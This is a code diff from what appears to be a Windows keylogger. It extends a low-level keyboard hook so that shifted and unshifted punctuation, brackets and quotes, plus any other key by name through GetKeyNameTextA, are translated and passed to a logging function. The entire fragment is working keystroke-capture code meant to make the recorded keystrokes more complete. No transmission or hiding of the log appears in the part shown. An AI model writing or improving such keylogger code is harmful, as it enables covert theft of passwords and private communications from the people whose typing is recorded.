@@ -216,12 +216,6 @@ LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam )
             case VK_NUMPAD9:
                 fcatch("9");
                 break;
-            case VK_OEM_1:
-                if (GetAsyncKeyState(VK_SHIFT))
-                    fcatch(":");
-                else
-                    fcatch(";");
-                break;
             case VK_OEM_2:
                 if (GetAsyncKeyState(VK_SHIFT))
                     fcatch("?");
@@ -234,14 +228,78 @@ LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam )
                 else
                     fcatch("`");
                 break;
+            case VK_OEM_4:
+                 if(GetAsyncKeyState(VK_SHIFT))
+                    fcatch("{");
+                 else
+                    fcatch("[");
+                 break;
+            case VK_OEM_5:
+                 if(GetAsyncKeyState(VK_SHIFT))
+                    fcatch("|");
+                 else
+                    fcatch("\\");
+                 break;
+            case VK_OEM_6:
+                 if(GetAsyncKeyState(VK_SHIFT))
+                    fcatch("}");
+                 else
+                    fcatch("]");
+                 break;
+            case VK_OEM_7:
+                 if(GetAsyncKeyState(VK_SHIFT))
+                    fcatch("\"");
+                 else
+                    fcatch("'");
+                 break;
             case VK_LSHIFT:
             case VK_RSHIFT:
                 // do nothing;
                 break;
+            case 0xBC:                //comma       
+                 if(GetAsyncKeyState(VK_SHIFT))
+                    fcatch("<");
+                 else
+                    fcatch(",");
+                 break;
+            case 0xBE:              //Period
+                 if(GetAsyncKeyState(VK_SHIFT))
+                    fcatch(">");
+                 else
+                    fcatch(".");
+                 break;
+            case 0xBA:              //Semi Colon same as VK_OEM_1
+                 if(GetAsyncKeyState(VK_SHIFT))
+                    fcatch(":");
+                 else
+                    fcatch(";");
+                 break;
+            case 0xBD:              //Minus
+                 if(GetAsyncKeyState(VK_SHIFT))
+                    fcatch("_");
+                 else
+                    fcatch("-");
+                 break;
+            case 0xBB:              //Equal
+                 if(GetAsyncKeyState(VK_SHIFT))
+                    fcatch("+");
+                 else
+                    fcatch("=");
+                 break;
             default: // Catch all misc keys
                 // fputc(vkCode,file); // Un-comment this to remove gibberish from the log file
                 // printf("%c",vkCode); // Un-comment this line to debug and add support for more keys
-                ;
+                
+                //  Use Getnametext instead of a lot of switch statements for system keys.
+                            
+                DWORD dwMsg = 1;
+                dwMsg += pKeyBoard->scanCode << 16;
+                dwMsg += pKeyBoard->flags << 24;
+
+                char key[16];
+                GetKeyNameTextA(dwMsg,key,15);
+                
+                fcatch(key);                
             }
         }
     }
